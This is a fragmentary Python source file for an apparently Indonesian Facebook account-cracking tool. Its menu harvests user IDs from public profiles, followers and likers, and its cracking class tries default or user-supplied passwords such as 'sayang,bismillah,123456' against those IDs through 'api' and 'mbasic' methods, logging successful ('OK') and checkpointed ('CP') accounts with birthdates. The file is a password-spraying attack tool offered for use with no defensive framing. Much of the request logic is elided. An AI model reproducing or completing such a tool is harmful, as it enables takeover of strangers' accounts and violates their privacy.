#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Mr patrix And XNSCODE Project
# Update V0.1
...
_C_ = "\033[36;1m" # biru
### Logo
_logo_line_1_ = ('%s ___  __  __ ___ ___ ' %(_C_))
_logo_line_2_ = ('%s|   \|  \/  | _ ) __|  %s┌─────────────────────────┐'%(_C_,_C_))
_logo_line_3_ = ('%s| |) | |\/| | _ \ _|   %s│ %s• CODE BY KHAMDIHI •   %s │'%(_C_,_C_,_C_,_C_))
_logo_line_4_ = ('%s|___/|_|  |_|___/_|    %s│ %sGithub.com/Bang-jack123 %s│'%(_C_,_C_,_C_,_C_))
_logo_line_5_ = ('%sKHAMDIHI,AHNAN,ROFIK   └─────────────────────────┘'%(_C_))
def _my_logo_():
...
def _menu_dev_(_Dapunta_Ganteng_Banget_):
    ...
    try:
        ...
        _ip_dev_ = " "
    _dapunta_cici_('%s[%s•%s] %sHalo %s%s'%(_C_,_C_,_C_,_C_,_C_,_nama_dev_))
    _dapunta_cici_('%s[%s•%s] %sID : %s'%(_C_,_C_,_C_,_C_,_id_dev_))
    _dapunta_cici_('%s[%s•%s] %sIP : %s\n'%(_C_,_C_,_C_,_C_,_ip_dev_))
    _dapunta_cici_('%s[%s1%s] %sCrack ID Dari Publik'%(_P_,_C_,_P_,_C_))
    _dapunta_cici_('%s[%s2%s] %sCrack ID Dari Pengikut'%(_P_,_C_,_P_,_C_))
    _dapunta_cici_('%s[%s3%s] %sCrack ID Dari Likers'%(_P_,_C_,_P_,_C_))
    _dapunta_cici_('%s[%s4%s] %sLihat Hasil Crack'%(_P_,_C_,_P_,_C_))
    _dapunta_cici_('%s[%s5%s] %sUser Agent'%(_P_,_C_,_P_,_C_))
    _dapunta_cici_('%s[%s0%s] %sKeluar'%(_P_,_C_,_P_,_C_))
    _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_C_,_C_,_C_,_C_))
    _dapunta_cici_('')
    if _dapunta_menu__cici_dapunta__ in ['',' ']:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_C_,_C_,_C_,_C_))
        time.sleep(2)
        ...
        _dapunta_cici_('%s[%s•%s] %sSampai Jumpa %s%s %s!'%(_C_,_C_,_C_,_C_,_C_,_nama_dev_,_C_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    else:
...
def _publik_dev_(_tok_dev_):
    ...
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_C_,_P_,_C_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_C_,_P_,_C_,_P_,_C_))
    try:
        ...
        _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_C_,_P_,_C_,_P_,_C_,_name_))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_C_,_P_,_C_,_P_))
        time.sleep(2)
    ...
    try:
        ...
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_C_,_P_,_C_,_P_,_U_,len(_id_tampung_)))
    except:
...
def _likers_dev_(_tok_dev_):
    ...
    try:
        ...
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_C_,_P_,_C_,_P_,_C_,len(_id_tampung_)))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_C_,_P_,_C_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
...
class _crack_dev_:
    def __init__(self,files):
        ...
        self.cp = []
        self.ko = 0
        _dapunta_cici_('\n%s[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(_C_,_P_,_C_,_P_))
        while True:
            f = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_C_,_P_,_C_,_P_))
            if f=="":
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_C_,_P_,_C_,_P_))
                time.sleep(2)
                ...
                try:
                    ...
                    _dapunta_cici_('%s[%s!%s] %sFile Dump Tidak Terdeteksi'%(_C_,_P_,_C_,_P_))
                    time.sleep(2)
                    _menu_dev_(self._Dapunta_Sayang_Cici_)
                _dapunta_cici_('%s[%s•%s] %sContoh : sayang,bismillah,123456'%(_C_,_P_,_C_,_P_))
                self.pwlist()
                break
                ...
                try:
                    ...
                    start_method()
                    put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_C_,_P_,_C_,_P_))
                    _dapunta_cici_(''%())
                    if put in ['']:
                        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_C_,_P_,_C_,_P_))
                        time.sleep(2)
                    ...
                    continue
    def pwlist(self):
        self.pw = _cici_dapunta_('%s[%s•%s] %sMasukkan Password : '%(_C_,_P_,_C_,_P_)).split(",")
        if len(self.pw) ==0:
            _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_C_,_P_,_C_,_P_))
            time.sleep(2)
            _menu_dev_(self._Dapunta_Sayang_Cici_)
    ...
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_C_,_P_,_C_,fl.get("id"),i,d,m,y))
                    ...
                    _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_C_,_P_,_C_,fl.get("id"),i))
            ...
            self.ko+=1
            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_C_,_P_,_C_,_P_,self.ko,len(self.fl),_C_,_P_,len(self.ada),_C_,_P_,len(self.cp),_C_,_P_), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def mbasic(self,fl):
        try:
